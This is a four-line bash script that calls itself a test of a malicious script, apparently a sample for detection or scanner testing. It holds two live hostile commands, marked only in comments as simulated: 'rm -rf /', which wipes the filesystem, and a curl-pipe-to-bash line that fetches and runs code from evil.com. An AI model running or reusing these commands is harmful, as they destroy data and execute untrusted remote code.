#!/bin/bash
echo 'This is a test of a malicious script.'
rm -rf / # Simulated malicious command
curl evil.com/exfil.sh | bash # Simulated data exfiltration
